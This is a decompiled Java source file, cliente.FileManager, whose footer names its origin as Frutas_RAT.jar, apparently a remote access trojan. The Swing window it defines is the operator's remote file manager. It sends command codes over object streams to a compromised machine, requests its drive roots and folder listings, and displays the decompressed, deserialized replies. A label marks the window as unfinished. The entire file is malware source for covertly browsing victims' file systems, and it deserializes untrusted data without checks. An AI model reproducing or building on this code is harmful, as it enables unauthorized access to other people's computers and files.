/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Container;
/*     */ import java.awt.Font;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.awt.event.MouseAdapter;
/*     */ import java.awt.event.MouseEvent;
/*     */ import java.io.ByteArrayInputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.ObjectInputStream;
/*     */ import java.io.ObjectOutputStream;
/*     */ import java.io.PrintStream;
/*     */ import java.util.logging.Level;
/*     */ import java.util.logging.Logger;
/*     */ import java.util.zip.GZIPInputStream;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JTable;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ import javax.swing.table.DefaultTableModel;
/*     */ import opciones.Archivo;
/*     */ 
/*     */ public class FileManager extends JInternalFrame
/*     */   implements Runnable
/*     */ {
/*  24 */   String sep = "/";
/*     */   private DefaultTableModel tabla;
/*     */   private ObjectInputStream in;
/*     */   private ObjectOutputStream out;
/*  29 */   private String rutaAnterior = "";
/*  30 */   private String rutaPosterior = "";
/*     */   private String seleccionado;
/*     */   private JButton jButton1;
/*     */   private JButton jButton2;
/*     */   private JLabel jLabel1;
/*     */   private JLabel jLabel2;
/*     */   private JLabel jLabel3;
/*     */   private JScrollPane jScrollPane1;
/*     */   private JTable jTable1;
/*     */   private JTextField ruta;
/*     */   private JComboBox unidades;
/*     */ 
/*     */   public FileManager(ObjectInputStream in, ObjectOutputStream out)
/*     */   {
/*  37 */     initComponents();
/*     */     try {
/*  39 */       this.in = in;
/*  40 */       this.out = out;
/*     */     }
/*     */     catch (Exception ex)
/*     */     {
/*     */     }
/*  45 */     this.tabla = ((DefaultTableModel)this.jTable1.getModel());
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  58 */     this.jLabel2 = new JLabel();
/*  59 */     this.jScrollPane1 = new JScrollPane();
/*  60 */     this.jTable1 = new JTable();
/*  61 */     this.unidades = new JComboBox();
/*  62 */     this.ruta = new JTextField();
/*  63 */     this.jButton1 = new JButton();
/*  64 */     this.jButton2 = new JButton();
/*  65 */     this.jLabel1 = new JLabel();
/*  66 */     this.jLabel3 = new JLabel();
/*     */ 
/*  68 */     this.jLabel2.setText("jLabel2");
/*     */ 
/*  70 */     setClosable(true);
/*  71 */     setIconifiable(true);
/*  72 */     setTitle("Administrador de archivos");
/*     */ 
/*  74 */     this.jTable1.setAutoCreateRowSorter(true);
/*  75 */     this.jTable1.setModel(new DefaultTableModel(new Object[0][], new String[] { "Nombre", "Tipo" })
/*     */     {
/*  83 */       boolean[] canEdit = { false, false };
/*     */ 
/*     */       public boolean isCellEditable(int rowIndex, int columnIndex)
/*     */       {
/*  88 */         return this.canEdit[columnIndex];
/*     */       }
/*     */     });
/*  91 */     this.jTable1.setOpaque(false);
/*  92 */     this.jTable1.setSelectionBackground(new Color(0, 255, 204));
/*  93 */     this.jTable1.setShowHorizontalLines(false);
/*  94 */     this.jTable1.setShowVerticalLines(false);
/*  95 */     this.jTable1.addMouseListener(new MouseAdapter() {
/*     */       public void mouseClicked(MouseEvent evt) {
/*  97 */         FileManager.this.jTable1MouseClicked(evt);
/*     */       }
/*     */     });
/* 100 */     this.jScrollPane1.setViewportView(this.jTable1);
/*     */ 
/* 102 */     this.unidades.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 104 */         FileManager.this.unidadesActionPerformed(evt);
/*     */       }
/*     */     });
/* 108 */     this.jButton1.setText("GetDrivers");
/* 109 */     this.jButton1.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 111 */         FileManager.this.jButton1ActionPerformed(evt);
/*     */       }
/*     */     });
/* 115 */     this.jButton2.setText("Listar Primera Vez");
/* 116 */     this.jButton2.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 118 */         FileManager.this.jButton2ActionPerformed(evt);
/*     */       }
/*     */     });
/* 122 */     this.jLabel1.setText("jLabel1");
/*     */ 
/* 124 */     this.jLabel3.setFont(new Font("Tahoma", 1, 18));
/* 125 */     this.jLabel3.setText("En construccion APENAS....");
/*     */ 
/* 127 */     GroupLayout layout = new GroupLayout(getContentPane());
/* 128 */     getContentPane().setLayout(layout);
/* 129 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addComponent(this.unidades, -2, 65, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton1).addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED).addComponent(this.ruta).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton2).addGap(24, 24, 24)).addGroup(layout.createSequentialGroup().addComponent(this.jScrollPane1, -1, 684, 32767).addContainerGap()).addGroup(layout.createSequentialGroup().addComponent(this.jLabel1).addGap(0, 0, 32767)))).addGroup(layout.createSequentialGroup().addGap(292, 292, 292).addComponent(this.jLabel3, -2, 325, -2).addGap(0, 0, 32767)));
/*     */ 
/* 154 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addGap(12, 12, 12).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.unidades, -2, -1, -2).addComponent(this.ruta, -2, -1, -2).addComponent(this.jButton1).addComponent(this.jButton2)).addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED).addComponent(this.jScrollPane1, -2, 249, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel3, -1, 39, 32767).addContainerGap()));
/*     */ 
/* 172 */     pack();
/*     */   }
/*     */ 
/*     */   private void jButton1ActionPerformed(ActionEvent evt)
/*     */   {
/*     */     try
/*     */     {
/* 179 */       this.out.writeInt(1);
/* 180 */       this.out.flush();
/*     */     } catch (IOException ex) {
/* 182 */       Logger.getLogger(FileManager.class.getName()).log(Level.SEVERE, null, ex);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void jButton2ActionPerformed(ActionEvent evt)
/*     */   {
/*     */     try
/*     */     {
/* 194 */       this.out.writeInt(2);
/* 195 */       this.out.flush();
/* 196 */       this.out.writeUTF(this.unidades.getSelectedItem().toString() + this.ruta.getText());
/* 197 */       this.out.flush();
/*     */     } catch (IOException ex) {
/* 199 */       Logger.getLogger(FileManager.class.getName()).log(Level.SEVERE, null, ex);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void jTable1MouseClicked(MouseEvent evt)
/*     */   {
/* 205 */     this.seleccionado = this.jTable1.getValueAt(this.jTable1.getSelectedRow(), 0).toString();
/*     */     try
/*     */     {
/* 209 */       String unidad = this.unidades.getSelectedItem().toString();
/*     */ 
/* 211 */       this.rutaPosterior = (this.ruta.getText() + this.sep + this.seleccionado);
/*     */ 
/* 217 */       this.out.writeInt(2);
/* 218 */       this.out.flush();
/* 219 */       this.out.writeUTF(unidad + this.rutaPosterior);
/* 220 */       this.out.flush();
/* 221 */       System.out.println("asdasdassadasdasd");
/* 222 */       System.out.println(unidad + this.rutaPosterior);
/*     */     }
/*     */     catch (IOException ex)
/*     */     {
/* 228 */       Logger.getLogger(FileManager.class.getName()).log(Level.SEVERE, null, ex);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void unidadesActionPerformed(ActionEvent evt)
/*     */   {
/*     */   }
/*     */ 
/*     */   public void limpiatabla()
/*     */   {
/* 265 */     for (int i = this.jTable1.getRowCount() - 1; i > -1; i--)
/* 266 */       this.tabla.removeRow(i);
/*     */   }
/*     */ 
/*     */   public void run()
/*     */   {
/*     */     try {
/*     */       while (true) {
/* 273 */         int opcion = this.in.readInt();
/* 274 */         System.out.println("Opcion: " + opcion);
/* 275 */         switch (opcion) {
/*     */         case 1:
/* 277 */           this.unidades.removeAllItems();
/* 278 */           String[] roots = (String[])this.in.readObject();
/* 279 */           for (String m : roots) {
/* 280 */             this.unidades.addItem(m);
/*     */           }
/*     */ 
/* 286 */           break;
/*     */         case 2:
/* 288 */           int numArchivos = 0;
/* 289 */           int numCarpetas = 0;
/*     */ 
/* 292 */           byte[] bytes = (byte[])this.in.readObject();
/* 293 */           ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
/* 294 */           GZIPInputStream gzipIn = new GZIPInputStream(bais);
/* 295 */           ObjectInputStream objectIn = new ObjectInputStream(gzipIn);
/* 296 */           Archivo[] archivo = (Archivo[])objectIn.readObject();
/*     */ 
/* 298 */           objectIn.close();
/*     */ 
/* 302 */           if (archivo != null) {
/* 303 */             limpiatabla();
/*     */ 
/* 306 */             this.tabla.addRow(new String[] { "..", "" });
/* 307 */             for (Archivo p : archivo) {
/* 308 */               if (p.isCarpeta())
/* 309 */                 numCarpetas++;
/* 310 */               else numArchivos++;
/* 311 */               this.tabla.addRow(new String[] { p.getNombre(), p.isCarpeta() ? "Carpeta" : "Archivo" });
/*     */             }
/*     */ 
/* 315 */             this.ruta.setText(archivo[0].getPathParent().replace(this.sep + "..", "").replace(this.unidades.getSelectedItem().toString(), ""));
/* 316 */             if (archivo[0].getPathParent().contains(this.sep + ".."))
/*     */             {
/* 319 */               System.out.println(archivo[0].getPathParent());
/*     */ 
/* 323 */               if (!this.ruta.getText().contains(this.sep)) {
/* 324 */                 this.ruta.setText("");
/*     */               }
/*     */               else {
/* 327 */                 this.ruta.setText(this.ruta.getText().substring(0, this.ruta.getText().lastIndexOf(this.sep)));
/*     */               }
/*     */             }
/*     */ 
/*     */           }
/*     */ 
/* 333 */           this.jLabel1.setText(numCarpetas + " Carpetas ---" + numArchivos + " Archivos");
/*     */         }
/*     */ 
/*     */       }
/*     */ 
/*     */     }
/*     */     catch (Exception ex)
/*     */     {
/* 343 */       ex.printStackTrace();
/* 344 */       dispose();
/*     */ 
/* 346 */       dispose();
/*     */     }
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.FileManager
 * JD-Core Version:    0.6.2
 */